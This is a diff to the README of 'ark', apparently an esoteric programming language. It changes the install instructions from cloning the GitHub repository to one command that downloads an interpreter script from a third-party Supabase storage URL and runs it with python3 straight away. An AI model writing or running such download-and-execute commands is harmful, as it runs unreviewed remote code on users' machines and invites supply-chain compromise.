@@ -5,8 +5,9 @@
 # The esoteric programming language that is *somewhat* useful.
 ## [Docs](https://github.com/spargle/ark/blob/main/.github/docs.md)
 ## install
-curl `curl -O https://github.com/spargle/ark.git`
-gh cli `gh repo clone spargle/ark`
+```
+curl -O https://fjuhzsqmccywkdgngmmk.supabase.in/storage/v1/object/public/source/ark_interpreter.py && python3 ark_interpreter.py
+```
 #### All details are also on the [esolangs.org wiki page](https://esolangs.org/wiki/ark).
 ### Using the interpreter:
 #### Run `ark_interpreter.py` and type in or paste the Ark source code of your project.
